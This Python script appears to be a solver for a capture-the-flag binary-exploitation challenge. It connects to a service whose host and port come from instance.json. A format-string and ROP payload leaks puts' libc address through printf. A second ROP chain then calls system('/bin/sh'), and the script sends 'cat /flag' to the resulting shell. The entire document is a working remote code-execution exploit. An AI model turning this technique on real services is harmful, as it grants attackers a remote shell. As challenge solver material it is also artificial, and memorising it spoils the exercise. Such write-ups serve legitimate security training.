import json
import socket
import struct
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
PROMPT = b">> "
BANNER = b"Look ma, I made sure you can't rop no more.\n"


def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise EOFError(f"connection closed before {marker!r}: {bytes(data)!r}")
        data.extend(chunk)
    return bytes(data)


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def send_sculpted(
    sock: socket.socket,
    payload: bytes,
    *,
    prompt_ready: bool = False,
    wait_after: bool = True,
) -> bytes:
    if len(payload) > 128:
        raise ValueError("initial stack image exceeds the first read")

    if not prompt_ready:
        recv_until(sock, PROMPT)
    sock.sendall(b"A" * 128)
    recv_until(sock, PROMPT)

    zero_offsets = [index for index, value in enumerate(payload) if value == 0]
    for index in reversed(zero_offsets):
        stage = bytearray(payload[: index + 1])
        if index != zero_offsets[0]:
            stage[:4] = b"AAAA"
        for earlier in zero_offsets:
            if earlier >= index:
                break
            stage[earlier] = 0x41
        sock.sendall(stage)
        if index != zero_offsets[0]:
            recv_until(sock, PROMPT)

    if wait_after:
        return recv_until(sock, PROMPT)
    return b""


def main() -> None:
    instance = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in instance["endpoints"] if item["name"] == "main")

    printf_plt = 0x4010D0
    main_addr = 0x4012A2
    puts_got = 0x404020
    body = b"exitLEAK%6$sEND\n"
    payload = body.ljust(80, b"A") + b"B" * 8
    payload += p64(printf_plt) + p64(main_addr) + p64(puts_got)

    with socket.create_connection((endpoint["host"], endpoint["port"]), timeout=10) as sock:
        sock.settimeout(10)
        response = send_sculpted(sock, payload)

        leak = response.split(b"LEAK", 1)[1].split(b"END", 1)[0]
        puts = int.from_bytes(leak, "little")
        libc_base = puts - 0x805A0
        if libc_base & 0xFFF:
            raise RuntimeError(f"unaligned libc base: {libc_base:#x}")

        pop_rdi = libc_base + 0x2A145
        ret = pop_rdi + 1
        bin_sh = libc_base + 0x1A5EA4
        system = libc_base + 0x53110
        stage_two = b"exit".ljust(80, b"A") + b"B" * 8
        stage_two += p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
        send_sculpted(sock, stage_two, prompt_ready=True, wait_after=False)
        sock.sendall(b"cat /flag\nexit\n")

        shell_output = bytearray()
        try:
            while chunk := sock.recv(4096):
                shell_output.extend(chunk)
        except TimeoutError:
            pass

    print(f"response={response!r}")
    print(f"puts={puts:#x} ({leak.hex()})")
    print(f"libc_base={libc_base:#x}")
    print(f"shell_output={bytes(shell_output)!r}")


if __name__ == "__main__":
    main()
